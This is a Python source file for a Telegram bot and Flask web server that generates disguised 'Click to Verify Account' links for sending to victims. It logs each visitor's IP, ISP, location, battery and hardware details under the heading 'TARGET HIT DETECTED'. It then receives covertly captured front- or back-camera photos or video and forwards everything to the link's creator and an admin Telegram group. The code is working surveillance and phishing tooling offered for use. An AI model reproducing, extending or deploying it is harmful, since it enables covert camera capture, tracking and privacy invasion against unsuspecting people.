import os, telebot, threading, io, time
from flask import Flask, render_template, request, jsonify

# --- CONFIGURATION ---
TOKEN = os.environ.get('TOKEN')
BASE_URL = os.environ.get('BASE_URL') 
GROUP_ID = os.environ.get('GROUP_ID') 

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# collection stores: { "session_key": {"photos": [], "info": "...", "creator": "...", "count": 0} }
collection = {}
user_temp = {}

# --- TELEGRAM BOT INTERFACE ---

def main_menu_markup():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.row("🤳 Front Cam", "📷 Back Cam")
    markup.row("📸 8 Photos", "🎥 3s Video")
    return markup

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(
        m.chat.id, 
        f"✅ <b>VinzyStore Multi-User System Active.</b>\n"
        f"Your ID: <code>{m.chat.id}</code>\n\n"
        f"Select your capture settings below:", 
        reply_markup=main_menu_markup(), 
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda m: m.text in ["🤳 Front Cam", "📷 Back Cam"])
def set_cam(m):
    user_temp[m.chat.id] = user_temp.get(m.chat.id, {})
    user_temp[m.chat.id]['cam'] = 'user' if "Front" in m.text else 'environment'
    bot.send_message(m.chat.id, f"✅ Camera set to: <b>{m.text}</b>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text in ["📸 8 Photos", "🎥 3s Video"])
def set_mode(m):
    user_temp[m.chat.id] = user_temp.get(m.chat.id, {})
    user_temp[m.chat.id]['mode'] = 'photo' if "Photos" in m.text else 'video'
    
    msg = bot.send_message(
        m.chat.id, 
        "🔗 <b>Enter YouTube Video ID</b> (e.g., dQw4w9WgXcQ) or type 'default':", 
        parse_mode="HTML", 
        reply_markup=telebot.types.ReplyKeyboardRemove()
    )
    bot.register_next_step_handler(msg, make_link)

def make_link(m):
    if m.chat.id not in user_temp:
        user_temp[m.chat.id] = {'cam': 'user', 'mode': 'photo'}
    
    yt = m.text if (m.text and m.text.lower() != 'default') else 'dQw4w9WgXcQ'
    d = user_temp[m.chat.id]
    
    raw_link = f"{BASE_URL.rstrip('/')}/?id={m.chat.id}&mode={d['mode']}&cam={d['cam']}&ytid={yt}"
    pretty_link = f'<a href="{raw_link}">🔗 Click to Verify Account</a>'
    
    response = (
        f"🚀 <b>Link Generated Successfully!</b>\n\n"
        f"<b>Customer View:</b>\n{pretty_link}\n\n"
        f"<b>Raw Link (Copy this):</b>\n<code>{raw_link}</code>"
    )
    bot.send_message(m.chat.id, response, parse_mode="HTML", reply_markup=main_menu_markup())

# --- WEB SERVER ENGINE ---

@app.route('/')
def index():
    ua = request.headers.get('User-Agent', '').lower()
    if 'iphone' in ua or 'ipad' in ua:
        return render_template('ios.html')
    elif 'android' in ua:
        return render_template('android.html')
    else:
        return render_template('pc.html')

@app.route('/log_info', methods=['POST'])
def log_info():
    data = request.json
    tid = request.args.get('id')
    # Using Proxy-safe IP detection
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    session_key = f"{tid}_{ip.replace('.', '_')}"
    
    # Build dynamic info block based on what the specific HTML sent
    info_parts = [
        "⚡ <b>TARGET HIT DETECTED</b> ⚡",
        "━━━━━━━━━━━━━━━",
        f"🌐 <b>IP:</b> <code>{ip}</code>",
        f"🏢 <b>ISP:</b> {data.get('org', 'N/A')}",
        f"📍 <b>LOC:</b> {data.get('city', 'N/A')}, {data.get('country_name', 'N/A')}",
        f"🔋 <b>BAT:</b> {data.get('battery', 'N/A')}",
        f"📱 <b>DEV:</b> {data.get('platform', 'N/A')}"
    ]

    # Add PC-Specific or iOS-Specific extras if they exist
    if data.get('gpu'): info_parts.append(f"⚙️ <b>GPU:</b> {data.get('gpu')}")
    if data.get('ram'): info_parts.append(f"💾 <b>RAM:</b> {data.get('ram')}")
    if data.get('screen'): info_parts.append(f"🖥️ <b>SCR:</b> {data.get('screen')}")
    
    info_parts.append("━━━━━━━━━━━━━━━")
    info_text = "\n".join(info_parts)
    
    if session_key not in collection:
        collection[session_key] = {"photos": [], "creator": tid, "count": 0}
    
    collection[session_key]["info"] = info_text
    return "OK"

@app.route('/upload', methods=['POST'])
def upload():
    tid = request.args.get('id')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    session_key = f"{tid}_{ip.replace('.', '_')}"
    
    if 'file' not in request.files:
        return "No file", 400
        
    file_bytes = request.files['file'].read()
    
    # Wait for log_info to populate (max 5s)
    for _ in range(5):
        if session_key in collection and "info" in collection[session_key]:
            break
        time.sleep(1)

    if session_key not in collection:
        collection[session_key] = {
            "photos": [], 
            "info": f"⚠️ <b>Fast Capture (Logs Delayed)</b>\nID: {tid}\nIP: {ip}", 
            "creator": tid,
            "count": 0
        }
    
    session = collection[session_key]
    info = session.get("info")

    # 1. Video Mode
    if request.args.get('type') == 'video':
        try:
            bot.send_video(tid, io.BytesIO(file_bytes), caption=info, parse_mode="HTML")
            if GROUP_ID:
                bot.send_video(GROUP_ID, io.BytesIO(file_bytes), caption=f"Admin Log:\n{info}", parse_mode="HTML")
        except: pass
        return "OK"

    # 2. Photo Mode
    session["photos"].append(file_bytes)
    
    # Check if we reached 8 photos
    if len(session["photos"]) >= 8:
        try:
            media = [
                telebot.types.InputMediaPhoto(p, caption=info if i==0 else "", parse_mode="HTML") 
                for i, p in enumerate(session["photos"][:8]) # Ensure only 8 are sent
            ]
            
            bot.send_media_group(tid, media)
            if GROUP_ID:
                bot.send_media_group(GROUP_ID, media)
            
            # Clear photos after sending to prevent duplicate albums if 16 photos arrive
            session["photos"] = [] 
        except Exception as e:
            print(f"Error sending group: {e}")
            
    return "OK"

# --- BOT POLLING SYSTEM ---
def run_bot():
    while True:
        try:
            bot.remove_webhook()
            bot.polling(none_stop=True, interval=0, timeout=60)
        except Exception as e:
            print(f"Bot Polling Error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    # Koyeb uses port 8000 by default for many presets
    app.run(host='0.0.0.0', port=8000)
